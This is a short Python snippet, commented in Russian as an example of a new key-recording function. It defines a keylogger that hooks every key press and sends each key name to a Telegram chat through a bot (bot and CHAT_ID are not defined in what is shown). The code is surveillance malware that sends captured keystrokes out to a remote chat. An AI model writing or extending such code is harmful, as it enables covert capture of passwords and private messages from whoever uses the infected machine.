# Пример новой функции: запись клавиш
import telebot, keyboard

def log_keys():
    keyboard.on_press(lambda e: bot.send_message(CHAT_ID, f"Нажато: {e.name}"))